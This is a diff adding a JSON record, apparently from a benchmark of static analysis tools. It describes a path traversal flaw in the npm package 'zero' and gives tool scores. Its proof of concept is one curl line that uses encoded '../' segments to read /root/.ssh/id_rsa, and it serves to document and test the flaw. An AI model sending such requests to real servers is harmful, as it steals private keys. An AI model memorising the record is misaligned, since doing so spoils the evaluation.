@@ -1,0 +1,66 @@
+{
+    "advisory": {
+        "id": "GHSA-crf7-fvjx-863q",
+        "cwe": "CWE-22"
+    },
+    "correct_cwe": "CWE-22",
+    "correct_package_link": "https://registry.npmjs.org/zero/-/zero-1.0.4.tgz",
+    "vulnerability": {
+        "vulnerability_location": [
+            {
+                "source": {
+                    "file": "lib/router/index.js",
+                    "lineno": 182,
+                    "code": "f app.all(\"*\", (request, response)=>{"
+                },
+                "sink": {
+                    "file": "lib/router/index.js",
+                    "lineno": 183,
+                    "code": " var endpointData = matchPath(manifest, forbiddenStaticFiles, buildPath, request.url)"
+                }
+            }
+        ]
+    },
+    "poc": [
+        {
+            "code": "curl http://localhost:8080/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/root/.ssh/id_rsa"
+        }
+    ],
+    "patch": [
+        {
+            "url": "https://github.com/remoteinterview/zero/tree/v1.0.6"
+        }
+    ],
+    "tools": {
+        "codeql": {
+            "score": "A"
+        },
+        "njsscan": {
+            "score": "C"
+        },
+        "graudit": {
+            "score": "C"
+        },
+        "insidersec": {
+            "score": "C"
+        },
+        "eslint": {
+            "score": "B"
+        },
+        "appinspector": {
+            "score": "C"
+        },
+        "msdevskim": {
+            "score": "C"
+        },
+        "drek": {
+            "score": "D"
+        },
+        "mosca": {
+            "score": "C"
+        },
+        "odgen": {
+            "score": "D"
+        }
+    }
+}
